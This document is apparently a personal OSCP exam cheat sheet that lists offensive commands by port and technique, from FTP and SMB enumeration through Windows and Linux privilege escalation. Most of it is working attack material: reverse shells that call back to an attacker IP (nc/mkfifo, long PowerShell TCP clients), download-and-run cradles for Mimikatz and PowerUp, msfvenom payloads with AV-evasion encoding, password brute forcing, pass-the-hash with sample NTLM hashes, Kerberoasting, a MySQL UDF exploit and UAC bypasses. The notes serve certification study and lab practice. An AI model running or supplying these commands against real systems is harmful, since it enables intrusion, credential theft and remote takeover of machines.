# OSCP-NOTES


# Port 21 - FTP

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111

Check banners for exploits when connecting as well!

Is anonymous access allowed? Can you connect via web browser?
wget --recursive ftp:///anonymous:anonymous@IP


# Port 22 - SSH
If you have usernames test login with username:username

Vulnerable Versions: 7.2p1

Vulnerable Versions: 7.2p1

nc 10.11.1.111 22

User can ask to execute a command right after authentication before it’s default command or shell is executed

ssh -v user@10.10.1.111 id


Check Auth Methods:

$ ssh -v 10.10.1.111

OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

Force Auth Method:

$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

BruteForce:

hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111

medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111


LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 

Id

python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id

Reverse

python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

SSH FUZZ

https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

cpan Net::SSH2

./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

SSH-AUDIT
https://github.com/arthepsy/ssh-audit

• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration                             
• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files                             

http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html


SSH Enum users < 7.7:
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"



# Port 25 - SMTP

nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111

smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

Send email unauth:

MAIL FROM:admin@admin.com

RCPT TO:DestinationEmail@DestinationDomain.com

DATA

test

# Port 69 - UDP - TFTP
This is used for tftp-server.

Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
Checks of FTP Port 21.
nmap -p69 --script=tftp-enum.nse 10.11.1.111

Receive:
250 OK

# Port 110/995
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle
PASS admin

List all emails

list

 Retrieve email number 5, for example

retr 9

https://book.hacktricks.xyz/pentesting/pentesting-pop

# Port 110

https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/


# Port 111 - Rpcbind
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
	srvinfo

	enumdomusers

	getdompwinfo

	querydominfo

	netshareenum

	netshareenumall

   # Port 135 - MSRPC
Some versions are vulnerable.

nmap 10.11.1.111 --script=msrpc-enum

msf > use exploit/windows/dcerpc/ms03_026_dcom

# Port 139/445 - SMB

Enum hostname

enum4linux -n 10.11.1.111

nmblookup -A 10.11.1.111

nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111

# Get Version

smbver.sh 10.11.1.111

Msfconsole;use scanner/smb/smb_version

ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 

smbclient -L \\\\10.11.1.111

# Get Shares

smbmap -H  10.11.1.111 -R <sharename>

echo exit | smbclient -L \\\\10.11.1.111

smbclient \\\\10.11.1.111\\<share>

smbclient -L //10.11.1.111 -N

nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111

smbclient -L \\\\10.11.1.111\\

# Check null sessions

smbmap -H 10.11.1.111

rpcclient -U "" -N 10.11.1.111

smbclient //10.11.1.111/IPC$ -N

# Exploit null sessions
enum -s 10.11.1.111
enum -U 10.11.1.111
enum -P 10.11.1.111
enum4linux -a 10.11.1.111
/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111

# Connect to username shares
smbclient //10.11.1.111/share -U username

# Connect to share anonymously
smbclient \\\\10.11.1.111\\<share>
smbclient //10.11.1.111/<share>
smbclient //10.11.1.111/<share\ name>
smbclient //10.11.1.111/<""share name"">
rpcclient -U " " 10.11.1.111
rpcclient -U " " -N 10.11.1.111

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run

# Bruteforce login
medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
nmap –script smb-brute 10.11.1.111

# nmap smb enum & vuln 
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# rpcclient commands
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

# smbmap
smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum

smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing

smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "

# Port 80

https://guif.re/webtesting

Whatweb? search versions and server types on searchsploit

nikto scan vulnerabilities

Make sure to use a few good wordlists with gobuster/dirb

Use feroxbuster to enumerate more on the direcrtories

Check source code! Check for passwords Iframes in css that might be directories. Look for and green characters that might be tokens e.g user&password&token=1  <--use BURP -->



For any RCE exploits try with reverse shell port 443, 80, 4444. If no luck try making a user with msfvenom. Both may work! If not working try a few other exploits! open the exploit search to be more generic!

If there are other services open, correlate what can viewed/used if RFI/LFI is found.

Try SQL injection! If nothing works, Always try cewl to generate wordlists and default credentials to login to admin consoles, and ssh! 

If a password is ever found try it on every service that allows a login!



uniquie Ports:
Always check if its. web site!




# Scanning

masscan -e tun0 -p 1-65535 --rate 2000 10.11.1.

sudo autorecon 

nmap -sV --script vuln

Scan for UDP

nmap 10.11.1.X -sU





# Windows File Transfer


certutil.exe -urlcache -split -f "http://IP/exploit.exe"

# FTP
  
  On LOCAL:

# pip install pyftpdlib

# python -m pyftpdlib -p 21 -w         <- "-w" flag enables anonymous write permission
                                          
                                          

open IP 21> ftp.txt

USER kali>> ftp.txt

PASS supersecret>> ftp.txt

GET nc.exe >> ftp.txt

bye >> ftp.txt

  
  
  
# SMB

[SHARE_NAME]  

   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes



On target: 

PS C:\> copy <FILE_NAME> \\<LHOST>\<SHARE_NAME>\<OUTPUT_FILE_NAME>

OR

PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force

PS C:\> $cred = New-Object System.Management.Automation.PSCredential('test', $pass)

PS C:\> New-PSDrive -Name "<SHARE_NAME>" -PSProvider "FileSystem" -Root "\\<LHOST>\<SHARE_NAME>" -Credential $cred


PS C:\> net use \\<LHOST>\<SHARE_NAME>

PS C:\> net use copy \\<LHOST>\<SHARE_NAME>\<FILE_NAME>


# Always check if there is a webpage to upload to! 

# POWERSHELL

powershell  -nop -exec bypass IEX (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.164/exploit.txt", "C:\Windows\Temp\exploit.txt.txt")



AV Evasion
powershell  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.164/PowerUp.ps1'); Invoke-AllChecks



powershell  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.164/Invoke-Mimikatz.ps1');Invoke-Mimikatz.ps1"


powershell "IEX (New-Object Net.WebClient).DownloadString ('http://192.168.119.164/Invoke-Mimikatz.ps1');Invoke-Mimikatz" 


# Windows Exploits

Juciy Potato

Check version of Windows
systeminfo
Check User Permissions
whoami /priv 


If SeImpersonatePrivilege is enabled 

Juicy Potato
Make and transfer shell.bat file with path\to\nc <IP> <PORT> -e cmd.exe
set up listener to port!!!
juicypotato.exe -l 1337 -p c:\windows\system32\shell.bat -t *


# Reverse Shells

Powershell Reverse Shell

powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.164',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


# UAC  bypass

https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/



# Kerberoating

powershell -ExecutionPolicy Bypass -File .\Invoke-Kerberoast.ps1 -OutputFormat Hashcat -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 .\roast.txt


powershell -ExecutionPolicy Bypass -File  .\Invoke-Kerberoast.ps1 -OutputFormat Hashcat -ErrorAction SilentlyContinue


https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/

Use Rubeus!

./Rubeus.exe kerberoast /outfile:hash.txt

Then Hashcat!

hashcat -m 13100 --force -a 0 hash.txt dict.txt

# Pass The Hash


	Mimikatz
	
privilege::debug
sekurlsa::pth /user:  /domain:  /ntlm:
 
 Then use PsExec.exe \\dc01 cmd
 
 
 
 check hashes to see if they are legit
 
 crackmapexec smb IP -u username -H #### -put hash here
 
 
 
wmiexec.py Administrator@10.11.1.24 -hashes :ee0c207898a5bccc01f38115019ca2fb 
	
Make sure to try all the hashes available!!!! Even if the names look weird



https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash

# MimiKatz

privilege::debug

sekurlsa::logonpasswords

powershell  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.164/PowerUp.ps1'); Invoke-AllChecks

powershell  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.164/mimikatz.exe'); privilege::debug

powershell  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.164/mimikatz.exe'); sekurlsa::logonpasswords


# Brute Force

hydra -V -f -L /wordlist/for/user -P /usr/share/seclists/    rdp://


# SSH Port Forwarding
                  in net      out net
sshuttle -vr root@10.1.1.1 10.3.3.0/24 << network you want to talk to

sudo ./chisel server -p 443 --reverse 
./chisel client 192.168.119.164:443 R:socks

if there is an internal port that you cannot communicate with externally

chisel client 192.168.119.164:80 R:8080:127.0.0.1:8080 <-- on the victim>

sudo ./chisel server -p 80 --reverse <--On local kali> make sure the port you listen on is able to make it throught the firewall.

Dynamic

sudo ssh -N -D Loopback:8080 user@address to forward through

# SSH different Algoithim

ssh -o KexAlgorithms=diffie-hellman-group1-sha1 test@123.123.123.123


# UPGRADE SHELL

python -c 'import pty; pty.spawn("/bin/bash")'

^Z

stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

stty raw -echo; fg

stty rows ROWS cols COLS

export TERM=xterm-256color

exec /bin/bash

# Windows upgrade shell

set PATH=%SystemRoot%\system32;%SystemRoot%;
set PATH=%SystemRoot%\system32;%SystemRoot%;


# SAMBA CONFIG

/etc/samba/smb.conf
client min protocol = LANMAN1

# METASPLOIT LISTENER


Listener

sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run; exit -y"

# MSFVENOM

msfvenom -p windows/adduser -f exe -o account.exe USER=hack3r PASS=Fuckyou123 -e x86/shikata_ga_nai -i 20

msfvenom -p windows/exec CMD=calc.exe -f dll -o calc.dll

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.164 LPORT=443 EXITFUNC=process -b "\x00" -f js_le    


Trojanize Windows Service:

msfvenom -p windows/exec CMD=calc.exe -f exe-service

msfvenom -p windows/adduser -f exe-service -o service.exe USER=hack3r PASS=s3cret^s3cret -e x86/shikata_ga_nai -i 20



Clientside word doc 

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe       


# SQLMAP

--os-cmd="certutil.exe -urlcache -split -f http://192.168.119.164/nc.exe"



# PERL Add USER to Windows
https://brakertech.com/add-user-to-windows-using-perl/

# BOF
https://anilcelik.medium.com/en-buffer-overflow-prep-overflow2-walkthrough-ed6d9447595b


# LINUX PRIVELEGE ESCALATION

always check

sudo -l
cat /etc/shadow
cat .bash_history


Kernal Exploits

uname -r 

uname -a

hostname

Backup Files

/root
/home
/tmp
/var
/var/backups
/opt
/opt/backups
/usr

Check exploits for running services:

ps aux | grep <USER>
ps aux | grep root


Is mysql running as root?

mysql -V

# Compiling & preparing the exploit (raptor_udf2.c)

Compile

gcc -g -c raptor_udf2.c

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Transfer and Prepare

cd /tmp && wget http://<LHOST>:<LPORT>/raptor_udf2.so

wget http://<LHOST>:<LPORT>/raptor_udf2.o

mysql -u root -p<PASSWORD>

mysql > use mysql;

mysql > SHOW VARIABLES LIKE 'datadir';             <- Locate where the plugin files are (we need it to create exploitation function)

mysql > CREATE TABLE potato(line blob);

mysql > INSERT INTO potato VALUES(load_file('/tmp/raptor_udf2.so'));

mysql > SELECT * FROM potato into dumpfile '/path_to_plugins_directory/raptor_udf2.so';

mysql > CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';    <- If you get an error (errno: 11) at this point, 
that means you need to repeat the previous step with different MySQL location, e.g. /usr/lib/mysql/raptor_udf2.so or /usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so (Also, if gcc is installed, try to look for gcc solution)

mysql > SELECT * FROM mysql.func;                  <- sanity check

+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql > select do_system('nc <LHOST> <LPORT> -e /bin/bash');


Cronjob tricks:

Always check CRONJOBS:

/etc/cron*

/etc/init.d

/etc/crontab                <- System wide cron job

/etc/cron.allow

/etc/cron.d

/etc/cron.daily

/etc/cron.hourly

/etc/cron.monthly

/etc/cron.weekly

/var/spool/cron             <- User crontabs

/var/spool/cron/crontabs    <- User crontabs

#Restricted shell escape techniques:

Get your restricted shell type by hitting: $SHELL or $0

First, check available commands such as cd, ls, echo, etc. Second, check for available operators such as >, >>, <, |. Third, check available programming languages such as perl, ruby, python, etc. Fourth, check whether you can run commands as root sudo -l. Fifth, check environmental variables run env or printenv

# lshell:

echo os.system('/bin/bash')

 echo "#!/bin/bash" > shell.sh
 echo "/bin/bash" >> shell.sh
echo'/shell.sh'

echo "#!/bin/bash" > shell.sh
echo "/bin/bash" >> shell.sh
echo^Khohoho/shell.sh

echo "$(bash 1>&2)"

echo <CTRL+V> <CTRL+J>

# bash:

# ?
cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo
ll non-existent-dir || 'bash'

echo () bash && echo

echo<CTRL+V><CTRL+I>() bash && echo

echo FREEDOM! && help () bash && help 
FREEDOM!

# rbash:

Common Exploitation Techniques:

If / is allowed, you can run /bin/sh or /bin/bash

If cp is allowed, you can copy /bin/sh or /bin/bash to your own directory.

From ftp, gdb, more, man, or less:

xxx > !/bin/sh

or

xxx > !/bin/bash

From rvim:

:python import os; os.system("/bin/bash")

From scp:

# scp -S /path/yourscript x y:

From awk:

# awk 'BEGIN {system("/bin/sh")}'

or

# awk 'BEGIN {system("/bin/bash")}'

From find:

# find / -name test -exec /bin/sh \;

or

# find / -name test -exec /bin/bash \;

Programming Languages Techniques:

From except:

# except spawn sh

From python:

# python -c 'import os;os.system("/bin/sh")'

or

# python3 -c 'import os;os.system("/bin/sh")'

From php:

# php -a then exec("sh -i");

From perl:

# perl -e 'exec "/bin/sh";'

From lua:

# os.execute('/bin/sh')

From ruby:

# exec "/bin/sh"

Advanced Techniques:

From ssh:

# ssh <USER>@<RHOST> -t "/bin/sh"

or

# ssh <USER>@<RHOST> -t "/bin/bash"

or

# ssh <USER>@<RHOST> -t "bash --noprofile"

or

# ssh <USER>@<RHOST> -t "() { :; }; /bin/bash" 

or

# ssh -o ProxyCommand="sh -c /tmp/<FILE>.sh"127.0.0.1     <- SUID

From git:

# git help status
# !/bin/bash

From pico:

# pico -s "/bin/bash"
# /bin/bash <CTRL+T>

From zip:

# zip /tmp/<FILE>.zip /tmp/<FILE> -T --unzip-command="sh -c /bin/bash"

From tar:

# tar cf /dev/null <FILE> --checkpoint=1 --checkpoint-action=exec=/bin/bash

From chsh (authenticated):

/bin/bash

From cp, if we can copy files into existing PATH:

#cp /bin/sh /current_directory; sh

From tee:

# echo "<PAYLOAD>" | tee <FILE>.sh

From vim:

:!/bin/ls -l .b*        <- File Listing

:set shell=/bin/sh
:shell

or

:!/bin/sh

C set UID shell:

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp) {
   setresgid(getegid(), getegid(), getegid());
   setresuid(geteuid(), geteuid(), geteuid());
   
   execve("/bin/sh", argv, envp);
   return 0;
}

If we can set PATH or SHELL variable:

# export PATH=/bin:/usr/bin:/sbin:$PATH
# export SHELL=/bin/sh

From ne (nice editor):

Go to -> Prefs -> Load Prefs... <- Read Files

From lynx:

# lynx --editor=/usr/bin/vim <PAYLOAD>
# export EDITOR=/usr/bin/vim

From mutt:

Click !:

/bin/sh



# PSexec 

psexec.py user:password@192.168.1.2
psexec.py -hashes :54d99af9cebee2444c1684ac33dadb1e administrator@RHOST cmd.exe


PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password cmd.exe

Running PsExec with passing the hash:

By default, PsExec does not pass the hash by itself, it requires Windows Credential Editor or Mimikatz
sekurlsa::pth /user:user /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c
PsExec.exe /accepteula \\192.168.1.2 cmd.exe

Running PsExec by uploading malicious executable:

This will continue the PsExec session through named pipe, and will only terminate once the process is terminated. Additionally this -c parameter will manually cleanup the executable.
PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -c update.exe

This will kill the PsExec session and leave the malicious executable on disk
PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -d update.exe



# Linux Privlege ESCALATION

https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

sudo -l

Run linpeas.sh


Kernel Exploits

OS Exploits

Password reuse (mysql, .bash_history, 000- default.conf...)

Known binaries with suid flag and interactive (nmap)

Custom binaries with suid flag either using other binaries or with command execution

Writable files owned by root that get executed (cronjobs)

MySQL as root

Vulnerable services (chkrootkit, logrotate)

Writable /etc/passwd

Readable .bash_history

SSH private key

Listening ports on localhost

Check /etc/init.d. and /srv/

/etc/fstab

/etc/exports

/var/mail

/var/log

/var/backup

anything in the root dir that is interesting


Process as other user (root) executing something you have permissions to modify

SSH public key + Predictable PRNG

apt update hooking (PreInvoke)

https://guif.re/linuxeop

# CURL


curl -f 'cmd=data'-XPOST http://url/

or

curl -d 'cmd=data' -XPOST http://url/



This is just in case we need more enumeration!

https://github.com/six2dez/OSCP-Human-Guide/blob/master/oscp_human_guide.md

# Windows Privlege escalation

 I never got an interactive powershell cmd so I use oneliners.

One-liners for script 4 & 5:
These one-liners download the script from your webserver and run it directly on the victim machine.

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"

If you have your ps1 file downloaded to the victim machine then run using this
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

I always prefer the one-liners, clean and simple, but you might lose your shell after executing it.

II) Manual enumerations:

Step1: Analyze script 1, 3 & 4

I will be listing out the manual process down below but for now these are the best guides I personally found to be very useful to understand what's happening under the hood.

Enumeration 1: http://www.fuzzysecurity.com/tutorials/16.html
Enumeration 2: http://hackingandsecurity.blogspot.in/2017/09/oscp-windows-priviledge-escalation.html
Enumeration 3: https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

III) Kernel exploits:

Analyze script 2 and 5.

Get the exploit-db number and replace it in step1 to get the code and compile it on your own, or once you have the exploit-db number you can directly get the precompiled exploit by using the number in step2.

Exploit Step1)
https://www.exploit-db.com/exploits/"Exploit-db-Number"/

Exploit Step2)
https://github.com/offensive-security/exploit-database-bin-sploits/find/master/" Exploit-db-Number"

Exploit step 3)
https://github.com/abatchy17/WindowsExploits/

So by this time either we have high privilege or we know what is the exact vulnerability to exploit to get our privilege.

http://virgil-cj.blogspot.com/2018/02/escalation-time.html


# UAC Bypass

x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe

grab that main.c file and then run that to compile it
https://github.com/turbo/zero2hero






https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/


/usr/share/metasploit-framework/data/post/bypassuac-x64.exe
